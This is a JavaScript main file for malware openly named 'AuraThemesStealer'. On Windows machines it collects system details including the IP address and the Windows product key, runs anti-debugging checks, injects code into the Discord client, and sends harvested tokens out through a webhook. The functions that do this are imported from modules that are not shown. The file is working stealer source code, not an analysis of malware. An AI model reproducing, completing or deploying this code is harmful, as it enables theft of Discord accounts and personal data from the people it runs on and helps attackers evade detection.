const { error } = require("./utils/console/error");
const process = require("process");
const config = require("./config/config")();

require("dotenv").config();

switch (process.platform) {
    case "win32":
        const { getInfo } = require("./modules/core/core");
        const { discordInjected } = require("./modules/injections/discord");
        const { webhookTokens } = require("./modules/findtokens/send");
        const { antidebug } = require("./modules/antidebug/antidebug");

        class AuraThemesStealer {
            constructor() {
                this.aurita();
            }
            async aurita() {
                try {
                    const { DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION } = await getInfo();
                    await antidebug(config.debugger, DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION);
                    await discordInjected(config.injection);
                    await webhookTokens();
                } catch (error) {
                    return console.error('An error occurred in main', error);
                }
            }
        }
        new AuraThemesStealer()
        break;
    default:
        break;
}

error();